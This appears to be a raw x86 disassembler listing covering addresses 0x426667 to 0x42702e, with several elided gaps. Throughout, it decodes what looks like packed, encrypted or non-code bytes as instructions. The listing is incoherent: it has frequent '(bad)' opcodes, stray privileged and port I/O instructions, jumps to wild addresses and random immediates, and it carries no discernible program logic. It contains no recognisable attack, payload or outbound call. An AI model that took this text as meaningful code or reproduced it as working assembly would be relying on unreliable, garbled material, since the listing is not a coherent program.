  426667:	add    ecx,DWORD PTR [eax]
  426669:	aad    0x9e
  42666b:	xchg   edi,eax
  42666c:	sub    al,BYTE PTR [esi]
  42666e:	mov    esi,0xb9f15680
  426673:	test   BYTE PTR [ecx-0x255737f],cl
  426679:	cmc    
  42667a:	xchg   ebp,eax
  42667b:	retf   
  42667c:	xor    ch,BYTE PTR [ecx]
  42667e:	adc    esi,DWORD PTR [ebx+0xe8737d7]
  426684:	mov    dl,0x99
  426686:	mov    DWORD PTR [edx-0x34],0xd2cae851
  42668d:	sub    DWORD PTR [ecx-0x69],0x2f7fc48e
  426694:	xor    eax,0x5a227d10
  426699:	push   0xffffffdf
  42669b:	xor    esi,DWORD PTR [esi-0x48]
  42669e:	into   
  42669f:	sub    BYTE PTR [ebp+0x65],ah
  4266a2:	pop    ecx
  4266a3:	mov    dh,0x77
  4266a5:	mov    eax,0xabc9ccc0
  4266aa:	cmc    
  4266ab:	inc    ebp
  4266ac:	push   esp
  4266ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266ae:	mov    edi,0x580ea343
  4266b3:	adc    DWORD PTR [ecx],edi
  4266b5:	sub    al,0x1
  4266b7:	dec    esp
  4266b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266b9:	xchg   ebp,eax
  4266ba:	ins    DWORD PTR es:[di],dx
  4266bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266bd:	mov    al,0x3e
  4266bf:	mov    ds:0xcc083c07,al
  4266c4:	les    eax,FWORD PTR [ebx+0x33]
  4266c7:	sbb    edx,DWORD PTR [edx]
  4266c9:	push   ecx
  4266ca:	rol    BYTE PTR [edx+0x3c],0xe4
  4266ce:	cli    
  4266cf:	aaa    
  4266d0:	imul   ecx,DWORD PTR [ebx+0x1],0xffffffc0
  4266d4:	fld    TBYTE PTR [edi]
  4266d6:	mov    ds:0x9485afa2,al
  4266db:	loope  0x426692
  4266dd:	jle    0x426662
  4266df:	(bad)  
  4266e0:	mov    edi,0xa16b9e7c
  4266e5:	sub    DWORD PTR [edx-0x54a110d5],esi
  4266eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266ec:	pop    edx
  4266ed:	lods   eax,DWORD PTR es:[esi]
  4266ef:	xchg   ebx,eax
  4266f0:	lods   eax,DWORD PTR ds:[esi]
  4266f1:	fld    TBYTE PTR [eax-0x7e]
  4266f4:	xor    DWORD PTR [ecx],0x49f46233
  4266fa:	sub    esp,DWORD PTR [ecx]
  4266fc:	rcl    DWORD PTR [edx],cl
  4266fe:	jnp    0x4266cd
  426700:	sti    
  426701:	(bad)  
  426702:	loopne 0x42669d
  426704:	jmp    0x426782
  426706:	or     DWORD PTR [esi],ebp
  426708:	ret    
  426709:	pop    esi
  42670a:	jp     0x4266f1
  42670c:	jno    0x42678a
  42670e:	sub    al,0x56
  426710:	pusha  
  426711:	ja     0x4266c4
  426713:	push   ss
  426714:	addr16 fwait
  426716:	mov    ds:0x6ccb2609,al
  42671b:	bound  eax,QWORD PTR [esi-0x52]
  42671e:	mov    dl,0x2c
  426720:	aaa    
  426721:	mov    ds:0xa591350d,al
  426726:	adc    BYTE PTR [ecx],dl
  426728:	or     eax,DWORD PTR [esi]
  42672a:	scas   eax,DWORD PTR es:[edi]
  42672b:	nop
  42672c:	xor    eax,0x597d935
  426731:	lahf   
  426732:	lods   al,BYTE PTR ds:[esi]
  426733:	out    dx,eax
  426734:	or     al,0x0
	...
  426796:	mov    eax,0xff2ace8d
  42679b:	imul   edi,esp,0xffffff9f
  42679e:	sbb    esp,eax
  4267a0:	leave  
  4267a1:	dec    ebx
  4267a2:	fcomp  DWORD PTR [edi-0x74]
  4267a5:	mov    edx,0x19a57
  4267aa:	pop    es
  4267ab:	add    DWORD PTR [eax],eax
  4267ad:	add    BYTE PTR [eax-0xd],cl
  4267b0:	xchg   ebx,eax
  4267b1:	in     al,dx
  4267b2:	mov    al,0xa6
  4267b4:	adc    esi,DWORD PTR [ecx]
  4267b6:	adc    al,BYTE PTR gs:[ebx+0x53]
  4267ba:	xchg   esi,eax
  4267bb:	ss leave 
  4267bd:	(bad)  
  4267bf:	or     eax,0x7c3be0e1
  4267c4:	mov    fs,WORD PTR [ecx+0x2671709e]
  4267ca:	lock add al,0xed
  4267cd:	pop    ss
  4267ce:	lea    ebx,[esi]
  4267d0:	lea    ecx,[esi+0x5375194]
  4267d6:	xor    BYTE PTR [eax-0x24],ch
  4267d9:	out    dx,eax
  4267da:	pop    ecx
  4267db:	shl    DWORD PTR [ebx-0x5241e089],1
  4267e1:	pusha  
  4267e2:	retf   
  4267e3:	mov    edx,es
  4267e5:	icebp  
  4267e6:	mov    edx,0x9a03457
  4267eb:	lods   eax,DWORD PTR ds:[esi]
  4267ec:	test   eax,0xd1b654d1
  4267f1:	sub    BYTE PTR fs:[ebx+0x2b7f22b],cl
  4267f8:	mov    esi,0xbd312413
  4267fd:	ret    
  4267fe:	(bad)  
  426800:	in     al,dx
  426801:	rcr    DWORD PTR [ebx+esi*1+0x4356f4a6],cl
  426808:	daa    
  426809:	mov    BYTE PTR [ecx-0xc],0x77
  42680d:	stos   DWORD PTR es:[edi],eax
  42680e:	jo     0x42687f
  426810:	sar    DWORD PTR [edi+0x179ec79c],cl
  426816:	mov    al,ds:0x9f76627f
  42681b:	adc    DWORD PTR [esi+0x44],esi
  42681e:	pop    edx
  42681f:	mov    ecx,es
  426821:	dec    edi
  426822:	fcomp  QWORD PTR [ecx]
  426824:	mov    ah,BYTE PTR [ecx+0x4f0333a5]
  42682a:	(bad)
  42682d:	jbe    0x42688e
  42682f:	push   es
  426830:	js     0x426804
  426832:	push   ebx
  426833:	mov    bl,0x76
  426835:	mov    esi,DWORD PTR [edi-0x44]
  426838:	in     eax,0x4e
  42683a:	pop    eax
  42683b:	push   ds
  42683c:	or     BYTE PTR [esi+0x23],cl
  42683f:	call   0x7d77f2e6
  426844:	sub    al,0x63
  426846:	out    0xbd,al
  426848:	xor    eax,0x88766eae
  42684d:	inc    esp
  42684e:	test   al,0xb5
  426850:	(bad)  
  426851:	push   ecx
  426853:	mov    eax,ds:0xb524cfd5
  426858:	and    ecx,ebx
  42685a:	inc    eax
  42685b:	(bad)  
  42685c:	jnp    0x4268c3
  42685e:	test   eax,0x8fe7bc9e
  426863:	mov    al,ds:0x34cf3157
  426868:	and    eax,0x3d8c90d8
  42686d:	(bad)  
  42686e:	(bad)  
  42686f:	cmp    ebp,DWORD PTR [ecx]
  426871:	pop    es
  426872:	cld    
  426873:	xor    BYTE PTR [ebx],ch
  426875:	(bad)  [eax+ebx*4]
  426878:	out    0x96,eax
  42687a:	shl    DWORD PTR [edx-0x4b],1
  42687d:	sub    al,0x37
  42687f:	mov    eax,0xbce97986
  426884:	push   ss
  426885:	retf   0x7b12
  426888:	loopne 0x426872
  42688a:	fnsave [esi-0x550b3eef]
  426890:	jns    0x426856
  426892:	mov    dl,0x78
  426894:	rcr    cl,cl
  426896:	out    0x5f,al
  426898:	stos   BYTE PTR es:[di],al
  42689a:	int    0xa2
  42689c:	or     esi,DWORD PTR [ebx]
  42689e:	add    BYTE PTR [edi-0x2b2fc895],ch
  4268a4:	sti    
  4268a5:	jmp    0xce8481e5
  4268aa:	inc    ecx
  4268ab:	frstor [edx+0x58]
  4268ae:	mov    al,BYTE PTR [ecx+0xa]
  4268b1:	scas   al,BYTE PTR es:[edi]
  4268b2:	cdq    
  4268b3:	(bad)  
  4268b4:	jmp    0x4268b6
	...
  426916:	mov    WORD PTR [esi+0x7d],cs
  426919:	jge    0x42691a
  42691b:	jg     0x4268a9
  42691d:	jmp    FWORD PTR [esi]
  42691f:	out    0xa0,eax
  426921:	stos   DWORD PTR es:[edi],eax
  426922:	xor    al,0x96
  426924:	es clc 
  426926:	pop    esi
  426927:	fwait
  426928:	add    DWORD PTR [eax],eax
  42692a:	pop    es
  42692b:	add    DWORD PTR [eax],eax
  42692d:	add    BYTE PTR [edx+esi*1-0x1b],ch
  426931:	scas   al,BYTE PTR es:[edi]
  426932:	loop   0x42691d
  426934:	adc    BYTE PTR [edi+0x52],al
  426937:	rcr    ebx,cl
  426939:	dec    edx
  42693a:	sbb    dl,BYTE PTR [ebx+0x53b32f59]
  426940:	add    dh,BYTE PTR [edx-0x740013da]
  426946:	or     BYTE PTR [edx-0x2e],ah
  426949:	mov    ds:0xfab73546,al
  42694e:	sub    edi,esp
  426950:	into   
  426951:	popa   
  426952:	mov    ecx,0xbcb2b4fb
  426957:	inc    eax
  426958:	stos   BYTE PTR es:[edi],al
  426959:	and    eax,0x46a926a3
  42695e:	mov    ah,0x88
  426960:	jbe    0x426911
  426962:	mov    bl,0x18
  426964:	push   es
  426965:	int3   
  426966:	adc    al,BYTE PTR [ecx]
  426968:	imul   eax,DWORD PTR [ebx+ecx*2+0x66],0xfffffff3
  42696d:	xchg   esi,eax
  42696e:	fisttp WORD PTR [ecx+0x311d87ad]
  426974:	or     edx,DWORD PTR [ebx-0x6c]
  426977:	sti    
  426978:	fistp  WORD PTR [edx]
  42697a:	retf   0x40da
  42697d:	xchg   ecx,eax
  42697e:	shl    edi,1
  426980:	nop
  426981:	mov    eax,0xe41f39b9
  426986:	and    BYTE PTR [ebp+0x28],al
  426989:	or     BYTE PTR [edi],ah
  42698b:	pop    edi
  42698c:	jp     0x426940
  42698e:	cmc    
  42698f:	pop    ds
  426990:	jo     0x4269ec
  426992:	leave  
  426993:	daa    
  426994:	inc    eax
  426995:	fsub   DWORD PTR [edx]
  426997:	clc    
  426998:	adc    BYTE PTR [eax-0x41317e2d],ah
  42699e:	push   edx
  42699f:	aad    0x36
  4269a1:	imul   esi,DWORD PTR [ebp-0xc0cc744],0x62
  4269a8:	push   ss
  4269a9:	add    DWORD PTR [edx-0x46],0x1e
  4269ad:	(bad)  
  4269ae:	scas   eax,DWORD PTR es:[edi]
  4269af:	ss es push edx
  4269b2:	inc    ebp
  4269b3:	js     0x426985
  4269b5:	ins    DWORD PTR es:[edi],dx
  4269b6:	cmp    bl,BYTE PTR [eax-0x25]
  4269b9:	lahf   
  4269ba:	js     0x4269fe
  4269bc:	add    DWORD PTR [edi+0x3fd6e106],esp
  4269c2:	adc    eax,0x229a705
  4269c7:	mov    ebp,0xad8a3f1
  4269cc:	xor    eax,ecx
  4269ce:	and    DWORD PTR [ebp-0x11],0x11
  4269d2:	pop    ebp
  4269d3:	jmp    0xa5c7e7a5
  4269d8:	xlat   BYTE PTR ds:[ebx]
  4269d9:	cwde   
  4269da:	xor    DWORD PTR [edi-0x73d92ffe],edx
  4269e0:	outs   dx,BYTE PTR ds:[esi]
  4269e1:	(bad)  
  4269e2:	dec    edx
  4269e3:	lea    ebx,[edi-0x31d86220]
  4269e9:	pop    esp
  4269ea:	jo     0x426a55
  4269ec:	inc    edi
  4269ed:	rol    DWORD PTR [eax],1
  4269ef:	pop    ds
  4269f0:	scas   eax,DWORD PTR es:[edi]
  4269f1:	mov    BYTE PTR [ebp-0x2b6509b4],bl
  4269f7:	popf   
  4269f8:	repz clc 
  4269fa:	and    cl,bh
  4269fc:	scas   eax,DWORD PTR es:[edi]
  4269fd:	add    DWORD PTR [edi],0x323323b2
  426a03:	les    ebx,FWORD PTR [edi-0x7c]
  426a06:	adc    esp,ebx
  426a08:	push   ebx
  426a09:	sar    cl,1
  426a0b:	std    
  426a0c:	pop    ds
  426a0d:	repz dec esp
  426a0f:	xchg   esp,eax
  426a10:	loope  0x4269c5
  426a12:	int    0x3d
  426a14:	and    BYTE PTR [edx-0xfafb1c3],bl
  426a1a:	scas   eax,DWORD PTR es:[edi]
  426a1b:	mov    eax,ds:0x8eaa8b4f
  426a20:	jge    0x426a1e
  426a22:	jle    0x426a6c
  426a24:	out    0x15,eax
  426a26:	mov    ecx,0x8f91e6b0
  426a2b:	imul   DWORD PTR [ebp+0x34]
  426a2e:	in     eax,dx
  426a2f:	sbb    al,BYTE PTR [esi]
  426a31:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  426a33:	jbe    0x426a00
	...
  426a95:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426a9b:	ja     0x426a78
  426a9d:	out    dx,eax
  426a9e:	xor    dl,BYTE PTR [edi+eiz*4]
  426aa1:	cld    
  426aa2:	mov    ebx,0x65671c6f
  426aa7:	pushf  
  426aa8:	add    DWORD PTR [eax],eax
  426aaa:	pop    es
  426aab:	add    DWORD PTR [eax],eax
  426aad:	add    BYTE PTR [ecx+0x1ff721e],al
  426ab3:	gs stc 
  426ab5:	xlat   BYTE PTR ds:[ebx]
  426ab6:	ss mov bh,0xf3
  426ab9:	ss mov edi,0xa026d326
  426abf:	sar    al,1
  426ac1:	jae    0x426a7b
  426ac3:	mov    esp,DWORD PTR [ebx+0x12]
  426ac6:	push   ds
  426ac7:	push   esp
  426ac9:	cli    
  426aca:	cmp    BYTE PTR [esi+edx*8],dh
  426acd:	inc    ecx
  426ace:	xor    edx,0xffffffee
  426ad1:	cmp    al,0xd7
  426ad3:	mov    esi,0x32513a8b
  426ad8:	mov    cl,0xe6
  426ada:	out    dx,eax
  426adb:	jg     0x426a87
  426add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ade:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  426ae0:	das    
  426ae1:	or     ecx,eax
  426ae3:	xor    eax,0x7222017d
  426ae8:	repnz dec ebp
  426aea:	imul   eax,edx,0x20
  426aed:	and    BYTE PTR [ecx-0x7c],dl
  426af0:	add    al,0x7f
  426af2:	and    ah,BYTE PTR [eax]
  426af4:	mov    WORD PTR [edx+0x76ae5d8c],gs
  426afa:	imul   edx,DWORD PTR [edi+ebx*1+0x70],0xf7391d51
  426b02:	test   BYTE PTR [eax-0xa94f07b],ah
  426b08:	mov    cl,0x0
  426b0a:	mov    eax,0xf247be5f
  426b0f:	test   al,0x7a
  426b11:	xchg   edi,eax
  426b12:	out    0x62,al
  426b14:	out    0xb,eax
  426b16:	mov    esp,0xea803e8c
  426b1b:	daa    
  426b1c:	add    al,0xcb
  426b1e:	jmp    0x426b4f
  426b20:	arpl   WORD PTR [esi],bx
  426b22:	jns    0x426aa6
  426b24:	sar    BYTE PTR [eax-0x64aaf4a5],1
  426b2a:	pop    ebp
  426b2b:	sub    eax,0x3379f35d
  426b30:	cdq    
  426b31:	sahf   
  426b32:	fsub   DWORD PTR [esi+0x43]
  426b35:	mov    WORD PTR [edx-0x5e],ds
  426b38:	dec    ecx
  426b39:	(bad)  
  426b3a:	jmp    0x426af2
  426b3c:	mov    ds:0x39df9f31,eax
  426b41:	adc    ebp,DWORD PTR [ebx+ecx*2-0x18]
  426b45:	arpl   si,cx
  426b47:	cmp    DWORD PTR cs:[edi+edx*8],ebx
  426b4b:	test   DWORD PTR [ebp-0x5c],ecx
  426b4e:	and    DWORD PTR [ecx],0x24
  426b51:	lods   eax,DWORD PTR ds:[esi]
  426b52:	shl    DWORD PTR [esi+eiz*4],0x9a
  426b56:	leave  
  426b57:	jbe    0x426adb
  426b59:	out    dx,al
  426b5a:	mov    eax,ds:0xa3f82394
  426b5f:	(bad)  
  426b60:	(bad)  
  426b62:	cmp    eax,0xf02b9fd8
  426b67:	pop    ebx
  426b68:	xor    ch,0xd2
  426b6b:	cmp    al,0x83
  426b6d:	and    al,ch
  426b6f:	sbb    esi,esi
  426b71:	ja     0x426bcc
  426b73:	add    dl,BYTE PTR [eax+0x7f]
  426b76:	mov    WORD PTR [eax],ss
  426b78:	sahf   
  426b79:	fwait
  426b7a:	(bad)  
  426b7c:	push   ss
  426b7d:	and    BYTE PTR [esi-0x3f],dh
  426b80:	inc    edx
  426b81:	or     ebx,ecx
  426b83:	lock or ebx,DWORD PTR [ebx]
  426b86:	or     ebx,0x15
  426b89:	xchg   edi,eax
  426b8a:	sub    ch,BYTE PTR [eax]
  426b8c:	les    ebp,FWORD PTR [edx+0x4b]
  426b8f:	cmp    DWORD PTR [eax+0x1e],edx
  426b92:	inc    esp
  426b93:	and    dh,cl
  426b95:	sub    eax,0xa9f9f40b
  426b9a:	add    DWORD PTR [edi-0x59],ebx
  426b9d:	pop    eax
  426b9e:	int3   
  426b9f:	imul   esp,DWORD PTR [edi-0x43483488],0xffffffa3
  426ba6:	dec    edx
  426ba7:	mov    cl,0x1b
  426ba9:	test   BYTE PTR [eax+0xd2a43e3],ch
  426baf:	test   al,0xb5
  426bb1:	pushf  
  426bb2:	mov    ebx,0x7f5e
	...
  426c13:	add    BYTE PTR [eax],al
  426c15:	add    dl,ah
  426c17:	pusha  
  426c18:	test   DWORD PTR [esi+0x74f3f787],esi
  426c1e:	je     0x426c67
  426c20:	push   0xffffffb6
  426c22:	loop   0x426bfe
  426c24:	xlat   BYTE PTR ds:[ebx]
  426c25:	popf   
  426c26:	ins    BYTE PTR es:[edi],dx
  426c27:	popf   
  426c28:	add    DWORD PTR [eax],eax
  426c2a:	pop    es
  426c2b:	add    DWORD PTR [eax],eax
  426c2d:	add    BYTE PTR [ebx-0x87610a8],bh
  426c33:	jb     0x426c97
  426c35:	adc    al,0x5d
  426c37:	addr16 adc al,0x71
  426c3a:	fstp   QWORD PTR [ebx]
  426c3c:	daa    
  426c3d:	daa    
  426c3e:	inc    ecx
  426c3f:	adc    cl,ch
  426c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c42:	retf   
  426c43:	add    eax,0x7b2b928d
  426c48:	test   eax,0x634230ca
  426c4d:	int    0x2a
  426c4f:	push   esi
  426c50:	out    0x38,eax
  426c52:	push   ebx
  426c53:	jbe    0x426ccf
  426c55:	rcl    BYTE PTR [eax-0x45e23f6d],cl
  426c5b:	mov    ebp,0xec488c52
  426c60:	repz stc 
  426c62:	cli    
  426c63:	sbb    al,0x7e
  426c65:	cld    
  426c66:	mov    al,ds:0x7b214f0b
  426c6b:	stos   DWORD PTR es:[edi],eax
  426c6c:	or     edx,DWORD PTR [ebx]
  426c6e:	cwde   
  426c6f:	mov    bl,0x6f
  426c71:	in     al,dx
  426c72:	push   ebx
  426c73:	dec    ebp
  426c74:	std    
  426c75:	and    eax,0xb79c97ce
  426c7a:	mov    ch,0xb9
  426c7c:	call   DWORD PTR [ebx+0x60cb45aa]
  426c82:	jo     0x426cc5
  426c84:	and    al,0x9c
  426c86:	inc    esi
  426c87:	lods   eax,DWORD PTR ds:[esi]
  426c88:	cmp    bh,cl
  426c8a:	data16 mov WORD PTR [edx-0x4a],ds
  426c8e:	and    esp,edx
  426c90:	xchg   edi,eax
  426c91:	addr16 xchg edi,eax
  426c93:	out    dx,eax
  426c94:	mov    ds:0x999f599c,eax
  426c99:	ja     0x426c30
  426c9b:	es iret 
  426c9d:	or     BYTE PTR [ecx+ecx*1],bh
  426ca0:	mov    edx,0xc4dde8e6
  426ca5:	nop
  426ca6:	and    al,0x7a
  426ca8:	sti    
  426ca9:	adc    bh,ah
  426cab:	fisubr WORD PTR [esi-0x7]
  426cae:	aad    0x8c
  426cb0:	stos   DWORD PTR es:[edi],eax
  426cb1:	scas   eax,DWORD PTR es:[edi]
  426cb2:	sbb    BYTE PTR [edi],ch
  426cb4:	sbb    al,dh
  426cb6:	lock ficom WORD PTR [ebp-0x75]
  426cba:	repnz mov cs,WORD PTR [ebx-0xf]
  426cbe:	pop    ebx
  426cbf:	ffree  st(1)
  426cc1:	iret   
  426cc2:	adc    ah,BYTE PTR [edi]
  426cc4:	js     0x426d10
  426cc6:	mov    ecx,0x4ea5d9c
  426ccb:	xchg   edx,eax
  426ccc:	call   0x8e530978
  426cd1:	inc    DWORD PTR [ecx]
  426cd3:	fimul  DWORD PTR [edx]
  426cd5:	push   ebp
  426cd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cd7:	dec    esi
  426cd8:	cmp    BYTE PTR [eax+0x2dadfd92],dh
  426cde:	mov    edx,0xdef10425
  426ce3:	icebp  
  426ce4:	ror    BYTE PTR [ecx],cl
  426ce6:	ins    DWORD PTR es:[edi],dx
  426ce7:	imul   ebp,DWORD PTR [ebp+0xf62d0d7],0x36
  426cee:	dec    ebx
  426cef:	pop    edx
  426cf0:	cli    
  426cf1:	jno    0x426d6b
  426cf3:	push   0xffffffbd
  426cf5:	cmp    eax,0x172afc14
  426cfa:	jno    0x426cbf
  426cfc:	pop    esi
  426cfd:	mov    edi,0x69008569
  426d02:	ret    
  426d03:	inc    ecx
  426d04:	or     al,0xb9
  426d06:	outs   dx,BYTE PTR ds:[esi]
  426d07:	in     eax,0x1f
  426d09:	sub    al,dl
  426d0b:	and    dh,BYTE PTR [edi+0x3f]
  426d0e:	mov    al,0x20
  426d10:	adc    DWORD PTR [ebx],0xffffffcd
  426d13:	mov    dh,0xbc
  426d15:	imul   edi,DWORD PTR [edi-0x10],0x9eab1bb0
  426d1c:	or     esi,DWORD PTR [esi]
  426d1e:	sbb    ecx,ebp
  426d20:	mov    edi,0x51c78422
  426d25:	int3   
  426d26:	and    edx,DWORD PTR [esi]
  426d28:	mov    ds:0x964484e0,al
  426d2d:	sub    al,0xac
  426d2f:	push   esi
  426d30:	shr    DWORD PTR [ebp+0xc5d1eb],0x0
	...
  426d93:	add    BYTE PTR [eax],al
  426d95:	add    BYTE PTR [edx],cl
  426d97:	mov    cl,0x61
  426d99:	repz sti 
  426d9b:	repz call 0x7c87:0x7e1b1bf9
  426da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426da4:	outs   dx,BYTE PTR ds:[esi]
  426da5:	cwde   
  426da6:	jae    0x426d46
  426da8:	add    DWORD PTR [eax],eax
  426daa:	pop    es
  426dab:	add    DWORD PTR [eax],eax
  426dad:	add    BYTE PTR [edi-0x77b87c8e],bh
  426db3:	retf   0xf793
  426db6:	jecxz  0x426dac
  426db8:	scas   eax,DWORD PTR es:[edi]
  426db9:	in     al,dx
  426dba:	dec    esi
  426dbb:	ins    BYTE PTR es:[edi],dx
  426dbc:	fild   DWORD PTR [ebx+0x1d4af49d]
  426dc2:	cmp    al,0x69
  426dc4:	mov    cl,0xef
  426dc6:	mov    eax,ds:0x89643db5
  426dcb:	push   eax
  426dcc:	ret    0x8cbd
  426dcf:	enter  0x3611,0xf3
  426dd3:	inc    eax
  426dd4:	inc    esp
  426dd5:	and    cl,BYTE PTR [esi-0x2c]
  426dd8:	outs   dx,BYTE PTR ds:[esi]
  426dd9:	and    eax,0xf9e7fb1c
  426dde:	test   DWORD PTR [edx],0xf0a45479
  426de4:	jno    0x426e30
  426de6:	daa    
  426de7:	inc    edi
  426de8:	or     al,BYTE PTR [eax-0x461e8761]
  426dee:	arpl   WORD PTR [ecx-0x176e8e55],di
  426df4:	add    eax,0xf655846d
  426df9:	jmp    0x426da9
  426dfb:	adc    BYTE PTR gs:[edi+0x607d6c4],dl
  426e02:	ret    0x171a
  426e05:	sbb    al,0x85
  426e07:	mov    cl,0xd
  426e09:	cli    
  426e0a:	cmp    eax,0x8b83c854
  426e0f:	sub    edx,DWORD PTR [edx+0x6d]
  426e12:	xchg   esi,eax
  426e13:	inc    esp
  426e14:	imul   ebp,DWORD PTR [ebp+0x669b69b0],0xd4fef005
  426e1e:	outs   dx,DWORD PTR ds:[esi]
  426e1f:	scas   eax,DWORD PTR es:[edi]
  426e20:	adc    eax,esi
  426e22:	bnd jno 0x426e12
  426e25:	inc    esp
  426e26:	lods   eax,DWORD PTR ds:[esi]
  426e27:	test   DWORD PTR [edx+0x1d],0xb951a9dd
  426e2e:	fcomi  st,st(1)
  426e30:	in     eax,dx
  426e31:	sbb    BYTE PTR [ecx-0x7e],0x7e
  426e35:	js     0x426db9
  426e37:	adc    dh,BYTE PTR [edx+edx*2+0x46]
  426e3b:	mov    ds:0xad4ee871,al
  426e40:	shr    BYTE PTR [esi-0x588a1f6a],cl
  426e46:	cld    
  426e47:	pop    ebx
  426e48:	adc    DWORD PTR [ecx],esi
  426e4a:	push   eax
  426e4b:	adc    al,BYTE PTR [ecx]
  426e4d:	mov    ecx,eax
  426e4f:	adc    cl,BYTE PTR [ecx+eiz*8+0x3d]
  426e53:	and    BYTE PTR [edx+ebp*1],bl
  426e56:	add    BYTE PTR [eax+0x2d042531],bh
  426e5c:	pop    es
  426e5d:	jnp    0x426e4d
  426e5f:	sar    BYTE PTR [edi-0x2b7f52d3],1
  426e65:	xchg   DWORD PTR [eax+eax*2],edi
  426e68:	mov    esi,0x7b7c5cf1
  426e6d:	stos   BYTE PTR es:[edi],al
  426e6e:	push   eax
  426e6f:	mov    ecx,0xf49fbf71
  426e74:	daa    
  426e75:	sbb    al,0xad
  426e77:	outs   dx,DWORD PTR ds:[esi]
  426e78:	sub    al,0x93
  426e7a:	rcr    DWORD PTR gs:[edi],0x54
  426e7e:	neg    BYTE PTR [edx-0x2b8c147d]
  426e84:	fsubr  DWORD PTR [ecx-0x59]
  426e87:	mov    bh,0xae
  426e89:	bound  ecx,QWORD PTR [edx+0x7265065b]
  426e8f:	retf   
  426e90:	push   0xffffffb2
  426e92:	int3   
  426e93:	aas    
  426e94:	mov    eax,ds:0x61ba6fd9
  426e99:	rcr    BYTE PTR [ebp-0x5e],1
  426e9c:	xchg   esp,eax
  426e9d:	sub    BYTE PTR [edx-0x6f124e3c],bh
  426ea3:	mov    WORD PTR [ebp-0x70],fs
  426ea6:	or     edx,DWORD PTR [ebp-0x449b33d]
  426eac:	ds stos DWORD PTR es:[edi],eax
  426eae:	xor    eax,0x2e1286a4
  426eb3:	sbb    ecx,esi
	...
  426f15:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f1c:	mov    dh,0xf7
  426f1e:	pop    eax
  426f1f:	or     BYTE PTR [ecx-0x1f4b175c],ch
  426f25:	test   eax,0x19f7a
  426f2a:	pop    es
  426f2b:	add    DWORD PTR [eax],eax
  426f2d:	add    BYTE PTR [edx+0x22],dh
  426f30:	outs   dx,DWORD PTR ds:[esi]
  426f31:	cmp    cl,0xd
  426f34:	add    cl,BYTE PTR [edx]
  426f36:	mov    bh,ah
  426f38:	loopne 0x426f0b
  426f3a:	pop    edx
  426f3b:	pop    edx
  426f3c:	sbb    eax,0x75f9e580
  426f41:	jmp    0x426fba
  426f43:	mov    cl,0xe1
  426f45:	ss in  al,dx
  426f47:	or     ebx,DWORD PTR [edx-0x2f8cf8e1]
  426f4d:	(bad)  
  426f4e:	and    ch,al
  426f50:	mov    DWORD PTR [edi-0x65b6fb3e],ebp
  426f56:	into   
  426f57:	ins    BYTE PTR es:[edi],dx
  426f58:	cmp    BYTE PTR [edx-0x40],al
  426f5b:	shl    DWORD PTR [edx+0x3e],cl
  426f5e:	into   
  426f5f:	pop    edi
  426f60:	xchg   esp,eax
  426f61:	pop    ebx
  426f62:	and    BYTE PTR [ebx+eax*1+0x7a],bl
  426f66:	cld    
  426f67:	dec    BYTE PTR [eax]
  426f69:	je     0x426f6c
  426f6b:	mov    eax,0x8aac9768
  426f70:	push   0x412b3e45
  426f75:	inc    esi
  426f76:	inc    edi
  426f77:	pop    ds
  426f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f79:	inc    edx
  426f7a:	xor    eax,0xcd13736d
  426f7f:	push   ebx
  426f80:	call   0xff377a4d
  426f85:	sti    
  426f86:	cli    
  426f87:	pop    ebx
  426f88:	jp     0x426f43
  426f8a:	and    eax,0x3b83b650
  426f8f:	xor    eax,0x29394f37
  426f94:	jb     0x426f4f
  426f96:	dec    ebp
  426f97:	push   edx
  426f98:	(bad)  
  426f9a:	adc    bh,al
  426f9c:	jecxz  0x426ff7
  426f9e:	cld    
  426f9f:	aas    
  426fa0:	in     eax,0xa8
  426fa2:	imul   DWORD PTR [ebx+0x4f4d4d76]
  426fa8:	mov    bl,0x2d
  426faa:	cmp    BYTE PTR [edi-0x73740e19],ch
  426fb0:	xor    eax,DWORD PTR [ebx+0x58]
  426fb3:	xchg   edx,eax
  426fb4:	push   edx
  426fb5:	test   eax,0xac899dfa
  426fba:	jg     0x426fe2
  426fbc:	mov    ecx,0x14092cb0
  426fc1:	or     al,0x9c
  426fc3:	mov    DWORD PTR [esi-0x45],edx
  426fc6:	and    al,BYTE PTR [ebx-0x568766ef]
  426fcc:	pop    es
  426fcd:	add    DWORD PTR [esi-0x42],ebp
  426fd0:	jp     0x426fe7
  426fd2:	dec    edx
  426fd3:	xchg   BYTE PTR [ebx+0x3f],dl
  426fd6:	popa   
  426fd7:	cmp    ecx,DWORD PTR [ebx]
  426fd9:	js     0x426fa6
  426fdb:	cli    
  426fdc:	out    dx,al
  426fdd:	fsubr  QWORD PTR [ebp+0x65fb7fdf]
  426fe3:	jne    0x426f7a
  426fe5:	add    al,0x2a
  426fe7:	out    dx,al
  426fe8:	or     DWORD PTR [ebp-0x7f],0xffffffee
  426fec:	lea    eax,[eax]
  426fee:	lahf   
  426fef:	loopne 0x427041
  426ff1:	lahf   
  426ff2:	mov    ch,0x8e
  426ff4:	add    BYTE PTR [eax],cl
  426ff6:	lahf   
  426ff7:	loop   0x426f88
  426ff9:	je     0x427038
  426ffb:	loop   0x426f84
  426ffd:	sbb    ch,ch
  426fff:	jg     0x427070
  427001:	inc    edx
  427002:	mov    edi,0xb9142589
  427007:	ficomp WORD PTR [esi]
  427009:	sub    eax,esi
  42700b:	xchg   BYTE PTR [ecx+0x5eff526f],bl
  427011:	lea    ebp,[eax-0x5d]
  427014:	mov    ah,ah
  427016:	sbb    eax,0xe1560b
  42701b:	rcl    DWORD PTR fs:[edx],cl
  42701e:	repz aam 0xf6
  427021:	fsubr  QWORD PTR [eax]
  427023:	add    al,0xcf
  427025:	cli    
  427026:	add    esp,DWORD PTR [ecx+0x15c58656]
  42702c:	aad    0x82
  42702e:	sbb    eax,0xc6c8a715
